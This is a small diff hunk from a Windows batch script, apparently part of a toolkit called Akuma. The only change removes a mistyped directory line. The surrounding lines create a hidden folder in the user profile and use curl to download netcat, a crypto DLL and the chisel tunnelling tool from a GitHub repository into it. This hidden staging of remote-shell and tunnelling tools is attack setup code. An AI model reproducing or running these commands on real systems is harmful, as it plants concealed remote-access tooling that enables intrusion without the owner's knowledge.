@@ -4,7 +4,6 @@ mkdir %userprofile%\Akuma
 attrib +h %userprofile%\Akuma
 mkdir %userprofile%\Akuma\nc
 %userprofile%
-cd %userprofile%\A7uma
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %userprofile%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %userprofile%\Akuma\nc\libcrypto-3.dll
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %userprofile%\Akuma\chisel.exe
